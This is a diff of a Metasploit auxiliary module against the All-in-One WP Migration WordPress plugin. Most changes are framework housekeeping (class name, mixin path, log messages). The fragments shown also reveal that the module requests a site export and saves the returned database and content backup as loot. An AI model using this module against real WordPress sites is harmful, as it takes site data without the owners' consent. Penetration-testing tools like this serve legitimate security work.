@@ -1,12 +1,10 @@
 ##
-# This module requires Metasploit: http://www.metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-  include Msf::HTTP::Wordpress
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -34,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])
-      ], self.class)
+      ])
   end
 
   def check
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Requesting website export...")
+    print_status("Requesting website export...")
     res = send_request_cgi(
       {
         'method'    => 'POST',
@@ -65,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.")
     else
       store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
-      print_good("#{peer} - Backup archive saved to #{store_path}")
+      print_good("Backup archive saved to #{store_path}")
     end
   end
 end
